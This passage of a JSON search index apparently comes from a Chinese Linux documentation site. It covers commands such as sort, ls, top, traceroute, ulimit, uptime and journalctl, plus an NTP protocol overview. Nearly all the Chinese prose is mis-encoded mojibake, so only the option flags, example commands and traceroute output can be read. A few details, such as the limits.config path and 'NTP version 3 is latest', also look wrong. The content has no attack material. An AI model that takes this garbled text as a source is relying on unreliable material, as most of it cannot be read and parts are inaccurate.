-k7 # ls -lh | sort -k67 è¿˜ä»¥ç²¾ç¡®åˆ°åˆ—çš„ç¬¬å‡ ä¸ªå­—ç¬¦, å¦‚ç¬¬å…­åˆ—çš„ç¬¬ä¸€ä¸ªå­—ç¬¦(é»˜è®¤è¡Œä¸º): ls -lh | sort -k6.1","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-sort.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-sort.html"},{"title":"ls","text":"æŸ¥çœ‹ç›®å½•æ–‡ä»¶ä¿¡æ¯ -l è¯¦ç»†ä¿¡æ¯ -t æŒ‰æ—¶é—´æ’åº -i è¾“å‡ºinnodeä¿¡æ¯ --block-size --block-size=m ä»¥Mä¸ºå•ä½ --block-size=G ä»¥Gä¸ºå•ä½ ls -l è¾“å‡ºçš„ç¬¬ä¸€ä¸ªå­—ç¬¦åˆ—è¡¨ è¾“å‡ºåˆ—å«ä¹‰ å­—ç¬¦ è¯´æ˜ æ™®é€šæ–‡ä»¶ d ç›®å½• l ç¬¦å·é“¾æ¥ c å­—ç¬¦è®¾å¤‡èŠ‚ç‚¹ b å—è®¾å¤‡èŠ‚ç‚¹ p å‘½åç®¡é“ s å¥—æ¥å­—","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-teacher.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-teacher.html"},{"title":"top","text":"æ˜¾ç¤ºæˆ–ç®¡ç†æ‰§è¡Œä¸­çš„ç¨‹åºï¼Œå®æ—¶åŠ¨æ€åœ°æŸ¥çœ‹ç³»ç»Ÿçš„æ•´ä½“è¿è¡Œæƒ…å†µï¼Œæ˜¯ä¸€ä¸ªç»¼åˆäº†å¤šæ–¹ä¿¡æ¯ç›‘æµ‹ç³»ç»Ÿæ€§èƒ½å’Œè¿è¡Œä¿¡æ¯çš„å®ç”¨å·¥å…·ã€‚ é€‰é¡¹ -b ä»¥æ‰¹å¤„ç†æ¨¡å¼æ“ä½œï¼› -c æ˜¾ç¤ºå®Œæ•´çš„æ²»å‘½ä»¤ï¼› -d å±å¹•åˆ·æ–°é—´éš”æ—¶é—´ï¼› -I å¿½ç•¥å¤±æ•ˆè¿‡ç¨‹ï¼› -s ä¿å¯†æ¨¡å¼ï¼› -S ç´¯ç§¯æ¨¡å¼ï¼› -i <æ—¶é—´> è®¾ç½®é—´éš”æ—¶é—´ï¼› -u <ç”¨æˆ·å> æŒ‡å®šç”¨æˆ·åï¼› -p <è¿›ç¨‹å·> æŒ‡å®šè¿›ç¨‹ï¼› -n <æ¬¡æ•°> å¾ªç¯æ˜¾ç¤ºçš„æ¬¡æ•°ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-top.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-top.html"},{"title":"traceroute","text":"Linux tracerouteå‘½ä»¤ç”¨äºæ˜¾ç¤ºæ•°æ®åŒ…åˆ°ä¸»æœºé—´çš„è·¯å¾„ã€‚ tracerouteæŒ‡ä»¤è®©ä½ è¿½è¸ªç½‘ç»œæ•°æ®åŒ…çš„è·¯ç”±é€”å¾„ï¼Œé¢„è®¾æ•°æ®åŒ…å¤§å°æ˜¯40Bytesï¼Œç”¨æˆ·å¯å¦è¡Œè®¾ç½®ã€‚ è¯­æ³•: traceroute [-dFlnrvx][-f<å­˜æ´»æ•°å€¼>][-g<ç½‘å…³>...][-i<ç½‘ç»œç•Œé¢>][-m<å­˜æ´»æ•°å€¼>][-p<é€šä¿¡ç«¯å£>][-s<æ¥æºåœ°å€>][-t<æœåŠ¡ç±»å‹>][-w<è¶…æ—¶ç§’æ•°>][ä¸»æœºåç§°æˆ–IPåœ°å€][æ•°æ®åŒ…å¤§å°] å‚æ•°è¯´æ˜ -d ä½¿ç”¨Socketå±‚çº§çš„æ’é”™åŠŸèƒ½ã€‚ -f <å­˜æ´»æ•°å€¼> è®¾ç½®ç¬¬ä¸€ä¸ªæ£€æµ‹æ•°æ®åŒ…çš„å­˜æ´»æ•°å€¼TTLçš„å¤§å°ï¼› -F è®¾ç½®å‹¿ç¦»æ–­ä½ï¼› -g <ç½‘å…³> è®¾ç½®æ¥æºè·¯ç”±ç½‘å…³ï¼Œæœ€å¤šå¯è®¾ç½®8ä¸ªï¼› -i <ç½‘ç»œç•Œé¢> ä½¿ç”¨æŒ‡å®šçš„ç½‘ç»œç•Œé¢é€å‡ºæ•°æ®åŒ…ï¼› -I ä½¿ç”¨ICMPå›åº”å–ä»£UDPèµ„æ–™ä¿¡æ¯ï¼› -m <å­˜æ´»æ•°å€¼> è®¾ç½®æ£€æµ‹æ•°æ®åŒ…çš„æœ€å¤§å­˜æ´»æ•°å€¼TTLçš„å¤§å°ï¼› -n ç›´æ¥ä½¿ç”¨IPåœ°å€è€Œéä¸»æœºåç§°ï¼› -p <é€šä¿¡ç«¯å£> è®¾ç½®UDPä¼ è¾“åè®®çš„é€šä¿¡ç«¯å£ï¼› -r å¿½ç•¥æ™®é€šçš„Routing Tableï¼Œç›´æ¥å°†æ•°æ®åŒ…é€åˆ°è¿œç«¯ä¸»æœºä¸Šã€‚ -s <æ¥æºåœ°å€> è®¾ç½®æœ¬åœ°ä¸»æœºé€å‡ºæ•°æ®åŒ…çš„IPåœ°å€ï¼› -t <æœåŠ¡ç±»å‹> è®¾ç½®æ£€æµ‹æ•°æ®åŒ…çš„TOSæ•°å€¼ï¼› -v è¯¦ç»†æ˜¾ç¤ºæŒ‡ä»¤çš„æ‰§è¡Œè¿‡ç¨‹ï¼› -w <è¶…æ—¶ç§’æ•°> è®¾ç½®ç­‰å¾…è¿œç«¯ä¸»æœºå›æŠ¥çš„æ—¶é—´ï¼› -x å¼€å¯æˆ–å…³é—­æ•°æ®åŒ…çš„æ­£ç¡®æ€§æ£€éªŒã€‚ -T ä½¿ç”¨tcpå‘é€ -U ä½¿ç”¨UDPçš„port 33434 æ¥è¿›è¡Œä¾¦æµ‹ï¼Œåªæ˜¯é»˜è®¤è®¾ç½® -f <å­˜æ´»æ•°å€¼> è®¾ç½®ç¬¬ä¸€ä¸ªæ£€æµ‹æ•°æ®åŒ…çš„å­˜æ´»æ•°å€¼TTLçš„å¤§å°ã€‚ -F è®¾ç½®å‹¿ç¦»æ–­ä½ã€‚ -g <ç½‘å…³> è®¾ç½®æ¥æºè·¯ç”±ç½‘å…³ï¼Œæœ€å¤šå¯è®¾ç½®8ä¸ªã€‚ -i <ç½‘ç»œç•Œé¢> ä½¿ç”¨æŒ‡å®šçš„ç½‘ç»œç•Œé¢é€å‡ºæ•°æ®åŒ…ã€‚ -I ä½¿ç”¨ICMPå›åº”å–ä»£UDPèµ„æ–™ä¿¡æ¯ã€‚ -m <å­˜æ´»æ•°å€¼> è®¾ç½®æ£€æµ‹æ•°æ®åŒ…çš„æœ€å¤§å­˜æ´»æ•°å€¼TTLçš„å¤§å°ã€‚ TTLè¡¨ç¤ºæœ€å¤§è·³æ•° -n ç›´æ¥ä½¿ç”¨IPåœ°å€è€Œéä¸»æœºåç§°ã€‚ -p <é€šä¿¡ç«¯å£> è®¾ç½®UDPä¼ è¾“åè®®çš„é€šä¿¡ç«¯å£ã€‚ -r å¿½ç•¥æ™®é€šçš„Routing Tableï¼Œç›´æ¥å°†æ•°æ®åŒ…é€åˆ°è¿œç«¯ä¸»æœºä¸Šã€‚ -s <æ¥æºåœ°å€> è®¾ç½®æœ¬åœ°ä¸»æœºé€å‡ºæ•°æ®åŒ…çš„IPåœ°å€ã€‚ -t <æœåŠ¡ç±»å‹> è®¾ç½®æ£€æµ‹æ•°æ®åŒ…çš„TOSæ•°å€¼ã€‚ -v è¯¦ç»†æ˜¾ç¤ºæŒ‡ä»¤çš„æ‰§è¡Œè¿‡ç¨‹ã€‚ -w <è¶…æ—¶ç§’æ•°> è®¾ç½®ç­‰å¾…è¿œç«¯ä¸»æœºå›æŠ¥çš„æ—¶é—´ã€‚ -x å¼€å¯æˆ–å…³é—­æ•°æ®åŒ…çš„æ­£ç¡®æ€§æ£€éªŒã€‚ æ˜¾ç¤ºåˆ°è¾¾ç›®çš„åœ°çš„æ•°æ®åŒ…è·¯ç”±: $ traceroute www.google.com traceroute: Warning: www.google.com has multiple addresses; using 66.249.89.99 traceroute to www.l.google.com (66.249.89.99), 30 hops max, 38 byte packets 1 192.168.0.1 (192.168.0.1) 0.653 ms 0.846 ms 0.200 ms 2 118.250.4.1 (118.250.4.1) 36.610 ms 58.438 ms 55.146 ms 3 222.247.28.177 (222.247.28.177) 54.809 ms 39.879 ms 19.186 ms 4 61.187.255.253 (61.187.255.253) 18.033 ms 49.699 ms 72.147 ms 5 61.137.2.177 (61.137.2.177) 32.912 ms 72.947 ms 41.809 ms 6 202.97.46.5 (202.97.46.5) 60.436 ms 25.527 ms 40.023 ms 7 202.97.35.69 (202.97.35.69) 40.049 ms 66.091 ms 44.358 ms 8 202.97.35.110 (202.97.35.110) 42.140 ms 70.913 ms 41.144 ms 9 202.97.35.14 (202.97.35.14) 116.929 ms 57.081 ms 60.336 ms 10 202.97.60.34 (202.97.60.34) 54.871 ms 69.302 ms 64.353 ms 11 * * * 12 209.85.255.80 (209.85.255.80) 95.954 ms 79.844 ms 76.052 ms MPLS Label=385825 CoS=5 TTL=1 S=0 13 209.85.249.195 (209.85.249.195) 118.687 ms 120.905 ms 113.936 ms 14 72.14.236.126 (72.14.236.126) 115.843 ms 137.109 ms 186.491 ms 15 nrt04s01-in-f99.1e100.net (66.249.89.99) 168.024 ms 140.551 ms 161.127 ms","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-traceroute.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-traceroute.html"},{"title":"ulimit","text":"é™åˆ¶ç³»ç»Ÿæœ€å¤§æ‰“å¼€æ–‡ä»¶æ•° ulimit ç³»ç»Ÿlinuxä¸­è¿›è¡Œèµ„æºé™åˆ¶ -a æ˜¾ç¤ºå½“å‰ç³»ç»Ÿæ‰€æœ‰limitä¿¡æ¯ -n æŸ¥çœ‹è¿›ç¨‹å¯ä»¥æ‰“å¼€çš„æœ€å¤§æ–‡ä»¶æè¿°ç¬¦çš„æ•°é‡ -u ç”¨æˆ·æœ€å¤§å¯ç”¨çš„è¿›ç¨‹æ•° å¯ä»¥åœ¨æ–‡ä»¶/etc/security/limits.configä¸­é…ç½® é…ç½®è§„åˆ™: <domain> <type> <item> <value> (å«ä¹‰ï¼šdomainç”¨æˆ·ä¸»ä½“ï¼Œ*è¡¨ç¤ºæ‰€æœ‰ï¼›typeé™åˆ¶ç±»å‹ï¼›itemé™åˆ¶èµ„æºåç§°ï¼›valueé™åˆ¶èµ„æºçš„å…·ä½“æ•°å€¼) eg: * soft nproc 40960 è½¯é™åˆ¶æœ€å¤§è¿›ç¨‹æ•° * hard nproc 40960 ç¡¬é™åˆ¶æœ€å¤§è¿›ç¨‹æ•° root soft nproc unlimited * soft nofile 262144 è½¯é™åˆ¶æœ€å¤§æ–‡ä»¶æ•° * hard nofile 262144 ç¡¬é™åˆ¶æœ€å¤§æ–‡ä»¶æ•° æ³¨è§£ å¯ä»¥é€šè¿‡ulimit -n [value]ä¿®æ”¹æ¯ä¸ªæ–‡ä»¶å¯æ‰“å¼€çš„æœ€å¤§è¿›ç¨‹æ•°ç›®ï¼Œç¼ºçœå€¼æ˜¯1024ï¼Œå¯ä»¥å†™å…¥åœ¨/etc/profileé‡Œç„¶åsourceé‡æ–°è½½å…¥ sessionè®¾ç½®: ulimit -a #æŸ¥çœ‹æ‰€æœ‰ ulimit -S -n1024 #è®¾ç½®å½“å‰ä¼šè¯æ‰“å¼€çš„æ–‡ä»¶æ•°è½¯è¿æ¥æ•°ä¸º1024 ulimit -H -n1024 #è®¾ç½®å½“å‰ä¼šè¯æ‰“å¼€çš„æ–‡ä»¶æ•°ç¡¬é“¾æ¥æ•°ä¸º1024 ulimit -n 1024 #è®¾ç½®å½“å‰ä¼šè¯æ‰“å¼€çš„æ–‡ä»¶æ•°è½¯è¿æ¥æ•°&&ç¡¬è¿æ¥æ•°éƒ½ä¸º1024","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ulimit.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ulimit.html"},{"title":"uname","text":"æ‰“å°å½“å‰ç³»ç»Ÿç›¸å…³ä¿¡æ¯(è·å–ç”µè„‘å’Œæ“ä½œç³»ç»Ÿçš„ç›¸å…³ä¿¡æ¯) -r , --release æ˜¾ç¤ºæ“ä½œç³»ç»Ÿçš„å‘è¡Œç¼–å·","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-uname.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-uname.html"},{"title":"uptime","text":"æ‰“å°ç³»ç»Ÿæ€»å…±è¿è¡Œäº†å¤šé•¿æ—¶é—´å’Œç³»ç»Ÿçš„å¹³å‡è´Ÿè½½ã€‚ æ‰“å°ç³»ç»Ÿæ€»å…±è¿è¡Œäº†å¤šé•¿æ—¶é—´å’Œç³»ç»Ÿçš„å¹³å‡è´Ÿè½½ã€‚ uptimeå‘½ä»¤å¯ä»¥æ˜¾ç¤ºçš„ä¿¡æ¯æ˜¾ç¤ºä¾æ¬¡ä¸º: ç°åœ¨æ—¶é—´ ç³»ç»Ÿå·²ç»è¿è¡Œäº†å¤šé•¿æ—¶é—´ ç›®å‰æœ‰å¤šå°‘ç™»é™†ç”¨æˆ· ç³»ç»Ÿåœ¨è¿‡å»çš„1åˆ†é’Ÿã€5åˆ†é’Ÿå’Œ15åˆ†é’Ÿå†…çš„å¹³å‡è´Ÿè½½ã€‚ æ˜¾ç¤ºuptimeå‘½ä»¤ç‰ˆæœ¬ä¿¡æ¯: uptime -V ç³»ç»Ÿå¹³å‡è´Ÿè½½æ˜¯æŒ‡åœ¨ç‰¹å®šæ—¶é—´é—´éš”å†…è¿è¡Œé˜Ÿåˆ—ä¸­çš„å¹³å‡è¿›ç¨‹æ•°ã€‚ æ¯ä¸ªCPUå†…æ ¸çš„å½“å‰æ´»åŠ¨è¿›ç¨‹æ•°ä¸å¤§äº3çš„è¯ï¼Œé‚£ä¹ˆç³»ç»Ÿçš„æ€§èƒ½æ˜¯è‰¯å¥½çš„ã€‚ å¦‚æœæ¯ä¸ªCPUå†…æ ¸çš„ä»»åŠ¡æ•°å¤§äº5ï¼Œé‚£ä¹ˆè¿™å°æœºå™¨çš„æ€§èƒ½æœ‰ä¸¥é‡é—®é¢˜ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-uptime.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-uptime.html"},{"title":"which","text":"å®šä½å‘½ä»¤ä½ç½®ï¼ˆwhatisæ˜¯å…³äºå‘½ä»¤çš„ç®€è¦è¯´æ˜ï¼‰","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-white.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-white.html"},{"title":"debianå¯åŠ¨","text":"UEFI ==ã€‹ åŠ è½½å¼•å¯¼ç¨‹åº ï¼ˆä¸€èˆ¬æƒ…å†µï¼‰ å†…æ ¸æ¶ˆæ¯ åœ¨æ§åˆ¶å°ä¸Šæ˜¾ç¤ºçš„å†…æ ¸é”™è¯¯ä¿¡æ¯ï¼Œèƒ½å¤Ÿé€šè¿‡è®¾ç½®ä»–ä»¬çš„é˜ˆå€¼æ°´å¹³æ¥é…ç½®: dmesg -n3 é”™è¯¯çº§åˆ«å€¼ é”™è¯¯çº§åˆ«åç§° è¯´æ˜ 0 KERN_EMERG ç³»ç»Ÿä¸å¯ç”¨ 1 KERN_ALERT è¡Œä¸ºå¿…é¡»è¢«ç«‹å³é‡‡å– 2 KERN_CRIT å±é™©æ¡ä»¶ 3 KERN_ERR é”™è¯¯æ¡ä»¶ 4 KERN_WARNING è­¦å‘Šæ¡ä»¶ 5 KERN_NOTICE æ™®é€šä½†é‡è¦çš„æ¡ä»¶ 6 KERN_INFO ä¿¡æ¯æç¤º 7 KERN_DEBUG debug çº§åˆ«çš„ä¿¡æ¯ ç³»ç»Ÿæ¶ˆæ¯ åœ¨ systemd ä¸‹, å†…æ ¸å’Œç³»ç»Ÿçš„ä¿¡æ¯éƒ½é€šè¿‡æ—¥å¿—æœåŠ¡ systemd-journald.service (åˆå journald )æ¥è®°å½•ï¼Œ æ”¾åœ¨ /var/log/journal ä¸‹çš„ä¸å˜çš„äºŒè¿›åˆ¶æ•°æ®ï¼Œ æˆ–æ”¾åœ¨\" /run/log/journal/ \"ä¸‹çš„å˜åŒ–çš„äºŒè¿›åˆ¶æ•°æ®. è¿™äº›äºŒè¿›åˆ¶æ—¥å¿—æ•°æ®ï¼Œå¯ä»¥é€šè¿‡ journalctl å‘½ä»¤æ¥è®¿é—®ã€‚ ä¾‹å¦‚ï¼Œä½ å¯ä»¥æ˜¾ç¤ºä»æœ€åä¸€æ¬¡å¯åŠ¨ä»¥æ¥çš„æ—¥å¿—ï¼ŒæŒ‰å¦‚ä¸‹æ‰€ç¤º: journalctl -b æ“ä½œ å‘½ä»¤ç‰‡æ®µ æŸ¥çœ‹ä»æœ€åä¸€æ¬¡å¯åŠ¨å¼€å§‹çš„ç³»ç»ŸæœåŠ¡å’Œå†…æ ¸æ—¥å¿— \"journalctl -b --system\" æŸ¥çœ‹ä»æœ€åä¸€æ¬¡å¯åŠ¨å¼€å§‹çš„å½“å‰ç”¨æˆ·çš„æœåŠ¡æ—¥å¿— \"journalctl -b --user\" æŸ¥çœ‹ä»æœ€åä¸€æ¬¡å¯åŠ¨å¼€å§‹çš„ \"$unit\" å·¥ä½œæ—¥å¿— \"journalctl -b -u $unit\" æŸ¥çœ‹ä»æœ€åä¸€æ¬¡å¯åŠ¨å¼€å§‹çš„ \"$unit\"çš„å·¥ä½œæ—¥å¿— (\"tail -f\" å¼æ ·) \"journalctl -b -u $unit -f\" ../linuxæŒ‡ä»¤/journalctl ../linuxæŒ‡ä»¤/modinfo ç¨‹åºæ˜¾ç¤º Linux å†…æ ¸æ¨¡å—ä¿¡æ¯ã€‚ ../linuxæŒ‡ä»¤/lsmod ç¨‹åºä»¥å¥½çœ‹çš„æ ¼å¼å±•ç¤º /proc/modules çš„å†…å®¹,æ˜¾ç¤ºå½“å‰å†…æ ¸åŠ è½½äº†å“ªäº›æ¨¡å—ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-debian-Debian-start.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-Debian-start.html"},{"title":"ntpæœåŠ¡","text":"NTPï¼ˆNetwork Time Protocolï¼Œç½‘ç»œæ—¶é—´åè®®ï¼‰æ˜¯ç”±RFC 1305å®šä¹‰çš„æ—¶é—´åŒæ­¥åè®®ï¼Œç”¨æ¥åœ¨åˆ†å¸ƒå¼æ—¶é—´æœåŠ¡å™¨ å’Œå®¢æˆ·ç«¯ä¹‹é—´è¿›è¡Œæ—¶é—´åŒæ­¥ã€‚NTPåŸºäºUDPæŠ¥æ–‡è¿›è¡Œä¼ è¾“ï¼Œä½¿ç”¨çš„UDPç«¯å£å·ä¸º123ã€‚ ä½¿ç”¨NTPçš„ç›®çš„æ˜¯å¯¹ç½‘ç»œå†…æ‰€æœ‰å…·æœ‰æ—¶é’Ÿçš„è®¾å¤‡è¿›è¡Œæ—¶é’ŸåŒæ­¥ï¼Œä½¿ç½‘ç»œå†…æ‰€æœ‰è®¾å¤‡çš„æ—¶é’Ÿä¿æŒä¸€è‡´ï¼Œä»è€Œä½¿è®¾å¤‡ èƒ½å¤Ÿæä¾›åŸºäºç»Ÿä¸€æ—¶é—´çš„å¤šç§åº”ç”¨ã€‚ å¯¹äºè¿è¡ŒNTPçš„æœ¬åœ°ç³»ç»Ÿï¼Œæ—¢å¯ä»¥æ¥æ”¶æ¥è‡ªå…¶ä»–æ—¶é’Ÿæºçš„åŒæ­¥ï¼Œåˆå¯ä»¥ä½œä¸ºæ—¶é’ŸæºåŒæ­¥å…¶ä»–çš„æ—¶é’Ÿï¼Œå¹¶ä¸”å¯ä»¥å’Œ å…¶ä»–è®¾å¤‡äº’ç›¸åŒæ­¥ã€‚ NTPçš„æŠ¥æ–‡æ ¼å¼ NTPæœ‰ä¸¤ç§ä¸åŒç±»å‹çš„æŠ¥æ–‡ï¼Œä¸€ç§æ˜¯æ—¶é’ŸåŒæ­¥æŠ¥æ–‡ï¼Œå¦ä¸€ç§æ˜¯æ§åˆ¶æŠ¥æ–‡ã€‚æ§åˆ¶æŠ¥æ–‡ä»…ç”¨äºéœ€è¦ç½‘ç»œç®¡ç†çš„åœºåˆï¼Œå®ƒ å¯¹äºæ—¶é’ŸåŒæ­¥åŠŸèƒ½æ¥è¯´å¹¶ä¸æ˜¯å¿…éœ€çš„ï¼Œè¿™é‡Œä¸åšä»‹ç»ã€‚ ä¸»è¦å­—æ®µçš„è§£é‡Šå¦‚ä¸‹ï¼š LIï¼ˆLeap Indicatorï¼‰ï¼šé•¿åº¦ä¸º2æ¯”ç‰¹ï¼Œå€¼ä¸º\"11\"æ—¶è¡¨ç¤ºå‘Šè­¦çŠ¶æ€ï¼Œæ—¶é’Ÿæœªè¢«åŒæ­¥ã€‚ä¸ºå…¶ä»–å€¼æ—¶NTPæœ¬èº«ä¸åšå¤„ç†ã€‚ VNï¼ˆVersion Numberï¼‰ï¼šé•¿åº¦ä¸º3æ¯”ç‰¹ï¼Œè¡¨ç¤ºNTPçš„ç‰ˆæœ¬å·ï¼Œç›®å‰çš„æœ€æ–°ç‰ˆæœ¬ä¸º3ã€‚ Modeï¼šé•¿åº¦ä¸º3æ¯”ç‰¹ï¼Œè¡¨ç¤ºNTPçš„å·¥ä½œæ¨¡å¼ã€‚ä¸åŒçš„å€¼æ‰€è¡¨ç¤ºçš„å«ä¹‰åˆ†åˆ«æ˜¯ï¼š0æœªå®šä¹‰ã€1è¡¨ç¤ºä¸»åŠ¨å¯¹ç­‰ä½“æ¨¡å¼ã€ 2è¡¨ç¤ºè¢«åŠ¨å¯¹ç­‰ä½“æ¨¡å¼ã€3è¡¨ç¤ºå®¢æˆ·æ¨¡å¼ã€4è¡¨ç¤ºæœåŠ¡å™¨æ¨¡å¼ã€5è¡¨ç¤ºå¹¿æ’­æ¨¡å¼æˆ–ç»„æ’­æ¨¡å¼ã€6è¡¨ç¤ºæ­¤æŠ¥æ–‡ä¸ºNTPæ§åˆ¶ æŠ¥æ–‡ã€7é¢„ç•™ç»™å†…éƒ¨ä½¿ç”¨ã€‚ Stratumï¼šç³»ç»Ÿæ—¶é’Ÿçš„å±‚æ•°ï¼Œå–å€¼èŒƒå›´ä¸º1ï½16ï¼Œå®ƒå®šä¹‰äº†æ—¶é’Ÿçš„å‡†ç¡®åº¦ã€‚å±‚æ•°ä¸º1çš„æ—¶é’Ÿå‡†ç¡®åº¦æœ€é«˜ï¼Œå‡†ç¡®åº¦ä» 1åˆ°16ä¾æ¬¡é€’å‡ï¼Œå±‚æ•°ä¸º16çš„æ—¶é’Ÿå¤„äºæœªåŒæ­¥çŠ¶æ€ï¼Œä¸èƒ½ä½œä¸ºå‚è€ƒæ—¶é’Ÿã€‚ Pollï¼šè½®è¯¢æ—¶é—´ï¼Œå³ä¸¤ä¸ªè¿ç»­NTPæŠ¥æ–‡ä¹‹é—´çš„æ—¶é—´é—´éš”ã€‚ Precisionï¼šç³»ç»Ÿæ—¶é’Ÿçš„ç²¾åº¦ã€‚ Root Delayï¼šæœ¬åœ°åˆ°ä¸»å‚è€ƒæ—¶é’Ÿæºçš„å¾€è¿”æ—¶é—´ã€‚ Root Dispersionï¼šç³»ç»Ÿæ—¶é’Ÿç›¸å¯¹äºä¸»å‚è€ƒæ—¶é’Ÿçš„æœ€å¤§è¯¯å·®ã€‚ Reference Identifierï¼šå‚è€ƒæ—¶é’Ÿæºçš„æ ‡è¯†ã€‚ Reference Timestampï¼šç³»ç»Ÿæ—¶é’Ÿæœ€åä¸€æ¬¡è¢«è®¾å®šæˆ–æ›´æ–°çš„æ—¶é—´ã€‚ Originate Timestampï¼šNTPè¯·æ±‚æŠ¥æ–‡ç¦»å¼€å‘é€ç«¯æ—¶å‘é€ç«¯çš„æœ¬åœ°æ—¶é—´ã€‚ Receive Timestampï¼šNTPè¯·æ±‚æŠ¥æ–‡åˆ°è¾¾æ¥æ”¶ç«¯æ—¶æ¥æ”¶ç«¯çš„æœ¬åœ°æ—¶é—´ã€‚ Transmit Timestampï¼šåº”ç­”æŠ¥æ–‡ç¦»å¼€åº”ç­”è€…æ—¶åº”ç­”è€…çš„æœ¬åœ°æ—¶é—´ã€‚ Authenticatorï¼šéªŒè¯ä¿¡æ¯ã€‚ NTPçš„å·¥ä½œæ¨¡å¼ è®¾å¤‡å¯ä»¥é‡‡ç”¨å¤šç§NTPå·¥ä½œæ¨¡å¼è¿›è¡Œæ—¶é—´åŒæ­¥ï¼š å®¢æˆ·ç«¯/æœåŠ¡å™¨æ¨¡å¼ å¯¹ç­‰ä½“æ¨¡å¼ å¹¿æ’­æ¨¡å¼ ç»„æ’­æ¨¡å¼ ç”¨æˆ·å¯ä»¥æ ¹æ®éœ€è¦é€‰æ‹©åˆé€‚çš„å·¥ä½œæ¨¡å¼ã€‚åœ¨ä¸èƒ½ç¡®å®šæœåŠ¡å™¨æˆ–å¯¹ç­‰ä½“IPåœ°å€ã€ç½‘ç»œä¸­éœ€è¦åŒæ­¥çš„è®¾å¤‡å¾ˆå¤šç­‰æƒ…å†µ ä¸‹ï¼Œå¯ä»¥é€šè¿‡å¹¿æ’­æˆ–ç»„æ’­æ¨¡å¼å®ç°æ—¶é’ŸåŒæ­¥ï¼›å®¢æˆ·ç«¯/æœåŠ¡å™¨å’Œå¯¹ç­‰ä½“æ¨¡å¼ä¸­ï¼Œè®¾å¤‡ä»æŒ‡å®šçš„æœåŠ¡å™¨æˆ–å¯¹ç­‰ä½“è·å¾— æ—¶é’ŸåŒæ­¥ï¼Œå¢åŠ äº†æ—¶é’Ÿçš„å¯é æ€§ã€‚ å®¢æˆ·ç«¯/æœåŠ¡å™¨æ¨¡å¼ åœ¨å®¢æˆ·ç«¯/æœåŠ¡å™¨æ¨¡å¼ä¸­ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€æ—¶é’ŸåŒæ­¥æŠ¥æ–‡ï¼ŒæŠ¥æ–‡ä¸­çš„Modeå­—æ®µè®¾ç½®ä¸º3ï¼ˆå®¢æˆ·æ¨¡å¼ï¼‰ã€‚ æœåŠ¡å™¨ç«¯æ”¶åˆ°æŠ¥æ–‡åä¼šè‡ªåŠ¨å·¥ä½œåœ¨æœåŠ¡å™¨æ¨¡å¼ï¼Œå¹¶å‘é€åº”ç­”æŠ¥æ–‡ï¼ŒæŠ¥æ–‡ä¸­çš„Modeå­—æ®µè®¾ç½®ä¸º4ï¼ˆæœåŠ¡å™¨æ¨¡å¼ï¼‰ã€‚ å®¢æˆ·ç«¯æ”¶åˆ°åº”ç­”æŠ¥æ–‡åï¼Œè¿›è¡Œæ—¶é’Ÿè¿‡æ»¤å’Œé€‰æ‹©ï¼Œå¹¶åŒæ­¥åˆ°ä¼˜é€‰çš„æœåŠ¡å™¨ã€‚ åœ¨è¯¥æ¨¡å¼ä¸‹ï¼Œå®¢æˆ·ç«¯èƒ½åŒæ­¥åˆ°æœåŠ¡å™¨ï¼Œè€ŒæœåŠ¡å™¨æ— æ³•åŒæ­¥åˆ°å®¢æˆ·ç«¯ã€‚ å¯¹ç­‰ä½“æ¨¡å¼ åœ¨å¯¹ç­‰ä½“æ¨¡å¼ä¸­ï¼Œä¸»åŠ¨å¯¹ç­‰ä½“å’Œè¢«åŠ¨å¯¹ç­‰ä½“ä¹‹é—´é¦–å…ˆäº¤äº’Modeå­—æ®µä¸º3ï¼ˆå®¢æˆ·ç«¯æ¨¡å¼ï¼‰å’Œ4ï¼ˆæœåŠ¡å™¨æ¨¡å¼ï¼‰çš„NTPæŠ¥æ–‡ã€‚ ä¹‹åï¼Œä¸»åŠ¨å¯¹ç­‰ä½“å‘è¢«åŠ¨å¯¹ç­‰ä½“å‘é€æ—¶é’ŸåŒæ­¥æŠ¥æ–‡ï¼ŒæŠ¥æ–‡ä¸­çš„Modeå­—æ®µè®¾ç½®ä¸º1ï¼ˆä¸»åŠ¨å¯¹ç­‰ä½“ï¼‰ï¼Œ è¢«åŠ¨å¯¹ç­‰ä½“æ”¶åˆ°æŠ¥æ–‡åè‡ªåŠ¨å·¥ä½œåœ¨è¢«åŠ¨å¯¹ç­‰ä½“æ¨¡å¼ï¼Œå¹¶å‘é€åº”ç­”æŠ¥æ–‡ï¼ŒæŠ¥æ–‡ä¸­çš„Modeå­—æ®µè®¾ç½®ä¸º2ï¼ˆè¢«åŠ¨å¯¹ç­‰ä½“ï¼‰ã€‚ ç»è¿‡æŠ¥æ–‡çš„äº¤äº’ï¼Œå¯¹ç­‰ä½“æ¨¡å¼å»ºç«‹èµ·æ¥ã€‚ä¸»åŠ¨å¯¹ç­‰ä½“å’Œè¢«åŠ¨å¯¹ç­‰ä½“å¯ä»¥äº’ç›¸åŒæ­¥ã€‚å¦‚æœåŒæ–¹çš„æ—¶é’Ÿéƒ½å·²ç»åŒæ­¥ï¼Œåˆ™ä»¥å±‚æ•°å°çš„æ—¶é’Ÿä¸ºå‡† 